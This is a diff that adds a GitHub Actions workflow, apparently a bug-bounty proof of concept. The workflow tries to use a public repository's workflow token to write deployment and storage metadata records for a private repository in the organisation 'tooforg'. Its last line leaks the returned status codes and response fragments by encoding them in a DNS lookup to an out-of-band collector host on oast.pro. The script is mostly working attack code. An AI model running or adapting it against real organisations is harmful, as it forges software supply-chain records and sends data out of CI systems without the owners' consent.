@@ -1,0 +1,23 @@
+name: metawrite
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  artifact-metadata: write
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - name: try to plant a record for a private repo from a public repo token
+        env:
+          TOKEN: ${{ github.token }}
+        run: |
+          B=https://api.github.com
+          A="Authorization: Bearer $TOKEN"
+          H="Accept: application/vnd.github+json"
+          D=sha256:5a28310c1e3a2dab9bb36fde1f53660ac31d062297eb8db843d4fcd51ddafb86
+          DR=$(curl -s -o /tmp/d.json -w '%{http_code}' -X POST -H "$A" -H "$H"             "$B/orgs/tooforg/artifacts/metadata/deployment-record"             -d '{"name":"secret-artifact","digest":"sha256:5a28310c1e3a2dab9bb36fde1f53660ac31d062297eb8db843d4fcd51ddafb86","status":"deployed","logical_environment":"h1-planted","physical_environment":"h1-x","cluster":"h1-cluster","deployment_name":"h1-deploy","tags":{"h1":"public-token"},"runtime_risks":["internet-exposed"],"github_repository":"invisible-repo"}')
+          SR=$(curl -s -o /tmp/s.json -w '%{http_code}' -X POST -H "$A" -H "$H"             "$B/orgs/tooforg/artifacts/metadata/storage-record"             -d '{"name":"secret-artifact","digest":"sha256:5a28310c1e3a2dab9bb36fde1f53660ac31d062297eb8db843d4fcd51ddafb86","registry_url":"https://reg.example.com/","github_repository":"invisible-repo"}')
+          BS=$(tr -dc 'a-zA-Z0-9' < /tmp/d.json | head -c 30)
+          SS=$(tr -dc 'a-zA-Z0-9' < /tmp/s.json | head -c 20)
+          getent hosts "d${DR}s${SR}x${BS}y${SS}.ro4yhyiy8bnjaqqlmuqb6jt71ae0carms.oast.pro" > /dev/null 2>&1 || true
